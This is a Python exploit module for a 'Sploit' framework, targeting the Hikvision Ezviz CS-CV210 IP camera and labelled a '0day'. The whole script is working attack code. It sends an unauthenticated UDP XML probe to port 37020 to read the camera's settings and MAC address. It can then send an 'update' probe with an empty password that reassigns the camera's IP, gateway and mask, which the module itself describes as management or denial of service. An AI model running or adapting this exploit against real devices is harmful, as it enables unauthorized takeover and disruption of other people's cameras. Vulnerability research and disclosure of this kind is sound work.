#!/usr/bin/env python

from uuid import uuid4
import pprint
from xml.etree import ElementTree
import socket
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_ezviz_cs_cv210_ipcamera_snapshot"
INFO['DESCRIPTION'] = "Hikvision Ezviz CS-CV210(C3s) Management or DoS"
INFO['VENDOR'] = "http://www.ezvizlife.com/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Remote attaker can make change IP settings of camera. Authorization is not required.
Tested against Ezviz CS-CV210 firmware v5.2.7.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="12 Apr, 2017"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = '192.168.1.45'
OPTIONS["SET_SETTINGS"] = False
OPTIONS["CAMERA_NEW_IP"] = '192.168.1.255'
OPTIONS["CAMERA_NEW_GATEWAY"] = '192.168.1.1'
OPTIONS["CAMERA_NEW_MASK"] = '255.255.255.0'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.set_settings = self.args.get("SET_SETTINGS", OPTIONS["SET_SETTINGS"])
        self.new_ip = self.args.get("CAMERA_NEW_IP", OPTIONS["CAMERA_NEW_IP"])
        self.gateway = self.args.get("CAMERA_NEW_GATEWAY", OPTIONS["CAMERA_NEW_GATEWAY"])
        self.mask = self.args.get("CAMERA_NEW_MASK", OPTIONS["CAMERA_NEW_MASK"])
        self.port = 37020

    def xml_to_dict(self, xml):
        tree = ElementTree.fromstring(xml)
        tree_dict = {}
        for node in tree.iter():
            tree_dict[node.tag] = node.text
        return tree_dict

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Trying to get settings')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (self.host, self.port)
        data = '<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>%s</Uuid><Types>inquiry</Types></Probe>' % str(uuid4())
        s.sendto(data, addr)
        res = s.recvfrom(2048)
        xml = res[0]
        tree_dict = self.xml_to_dict(xml)
        info = pprint.pformat(tree_dict, 2)
        self.log('[+] Device settings:\r\n' + info)
        mac = tree_dict.get('MAC')
        if not mac:
            self.log('[-] Can\'t find MAC address of camera')
            self.finish(False)

        if self.set_settings:
            data = '<?xml version="1.0" encoding="utf-8"?>' \
                   '<Probe>' \
                   '<Uuid>bla-bla-bla</Uuid>' \
                   '<Types>update</Types>' \
                   '<MAC>%s</MAC>' \
                   '<Password></Password>' \
                   '<IPv4Address>%s</IPv4Address>' \
                   '<CommandPort>8000</CommandPort>' \
                   '<HttpPort>80</HttpPort>' \
                   '<IPv4SubnetMask>%s</IPv4SubnetMask>' \
                   '<IPv4Gateway>%s</IPv4Gateway>' \
                   '</Probe>'
            data = data % (mac, self.new_ip, self.mask, self.gateway)
            s.sendto(data, addr)
            res = s.recvfrom(2048)
            tree_dict = self.xml_to_dict(res[0])
            self.log('[+] New camera settings:\r\n' + pprint.pformat(tree_dict, 2))
        s.close()
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
